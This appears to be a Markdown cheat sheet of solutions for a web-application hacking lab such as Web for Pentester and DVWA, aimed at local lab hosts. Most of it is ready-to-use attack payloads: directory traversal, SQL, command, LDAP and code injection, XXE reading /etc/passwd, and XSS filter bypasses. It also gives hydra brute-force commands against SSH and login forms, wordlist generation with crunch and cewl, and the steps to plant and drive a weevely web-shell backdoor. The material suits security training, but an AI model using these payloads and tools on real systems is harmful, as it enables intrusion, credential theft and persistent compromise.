# Phase III: Vulnerbility discovery & Exploitation
### Directory Traversal
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | ../../../../../../../../../etc/passwd |
| example&nbsp;2 | /var/www/files/../../../etc/passwd |
| example&nbsp;3 | ../../../etc/passwd%00 `Null Bytes Injection` |

### File Include
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | ../../../../../../../../../etc/passwd |
| example&nbsp;2 | ../../../etc/passwd%00 `Null Bytes Injection` |

### SQL Injection
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | root'+OR+'1'='1, `root'OR+1=1+--` |
| example&nbsp;2 | root'%09OR'1'='1 |
| example&nbsp;3 | root'/**/OR/**/'1'='1 |
| example&nbsp;4 | 2+OR+1=1 |
| example&nbsp;5 | 2+OR+1=1#123 |
| example&nbsp;6 | 2+OR+1=1#123 |
| example&nbsp;7 | 2%0AOR+1=1# |
| example&nbsp;8 | name\`,IF((SELECT+0x61)=0x61%2Cid%2Cage)+%23 |
| example&nbsp;9 | IF((SELECT+0x61)=0x61%2Cid%2Cage), `IF((SELECT'a')='a',id,age)` |

### Command Injection
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | 10.0.2.4+%26%26+cat+%2Fetc%2Fpasswd `10.0.2.4 && cat /etc/passwd`|
| example&nbsp;2 | 10.0.2.4%0Acat+%2Fetc%2Fpasswd `10.0.2.4(New Line)&& cat /etc/passwd`|
| example&nbsp;3 | curl -X GET http://10.0.2.4/commandexec/example3.php?ip=10.0.2.4%0A%26%26+cat+%2Fetc%2Fpasswd |

### LDAP attacks
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | http://10.0.2.4/ldap/example1.php `remove all parameter` |
| example&nbsp;2 | http://10.0.2.4/ldap/example2.php?name=hacker)(cn=*))%00&password=1234 |

### XML attacks
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | http://10.0.2.4/xml/example1.php?xml=%3C%21DOCTYPE%20foo%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2Ftest%3E `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>` |
| example&nbsp;2 | http://10.0.2.4/xml/example2.php?name=hacker%27+or+1=1]%00 `hacker'+or+'1'='1`|

## Hydra
### Secure Shell
hydra -P /usr/shared/wordlists/rockyou.txt
	  -l root
	  ssl://10.0.4.5
	  -f -vVd 
	  -o result.txt
	  -e nsr

### Basic Authentication
hydra -P /usr/shared/wordlists/rockyou.txt
	  -l admin
	  10.0.4.5 http-get "/auth"
	  -f
### Form Authentication
hydra -P /usr/shared/wordlists/rockyou.txt
	  -l admin
	  10.0.4.5 http-post-form "/login:username=^USER^:password=^PASS^:submit=Login:F=Invalid username"
	  -f

### DVWA Authentication
hydra -l admin -P /usr/share/wordlists/rockyou.txt 	
	  192.168.7.159 -s 8080 http-get-form 
	  "/dvwa/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=Login:F=password incorrect"
	  -f
	  -vVd

### Create WordList
* crunch 4 4 `minimum 4 characters and maximum  4 characters`
* crunch 4 4 -o mywordlist.txt
* crunch 4 4 1234567890 -o mywordlist.txt
* crunch 4 4 -t @%,^ -o mywordlist.txt `@=lowercase characters, %=numbers, ,=uppercase characters, ^=symbols`
* crunch 4 4 -f /usr/share/crunch/charset.lst lalpha -o mywordlist
* cewl -d 2 -m 4 -w test.txt http://www.php.net `-d=depth, -m=minimum word length, -w=write`

### Code Injection
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | http://10.0.2.4/codeexec/example1.php?name=hacker".system('uname -a');# |
| example&nbsp;2 | http://10.0.2.4/codeexec/example2.php?order=id);}system('uname%20-a');%2F%2F |

### XSS
| excercise | solution |
|-----------|----------|
| example&nbsp;1 | example1.php?name=%3Cscript%3Ealert(1)%3C%2fscript%3E |
| example&nbsp;2 | example2.php?name=<scri<sCrIpt>pt>alert(1)<%2fscri<%2fScRipt>pt> |
| example&nbsp;3 | example3.php?name=<scri<sCrIpt>pt>alert(1)<%2fscri<%2fScRipt>pt> |
| example&nbsp;4 | example4.php?name=<img src=xxx onerror=alert(1)> |
| example&nbsp;5 | example5.php?name=<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script> |
| example&nbsp;6 | example6.php?name=hacker";alert(1)%2f%2f |
| example&nbsp;7 | example7.php?name=hacker';alert(1)%2f%2f |
| example&nbsp;8 | example8.php/"><script>alert(1)</script> |
| example&nbsp;8 | example9.php/#<script>alert(1)</script> |

## Backdoor
### weevely
 1. weevely generate 1234 /root/hack.php
 2. upload file
 3. weevely http://.../upload/hack.php 123
 4. weevely> help
 5. weevely> :system_info
 6. weevely> :audit_etcpasswd
 7. weevely> :bruteforce_sql
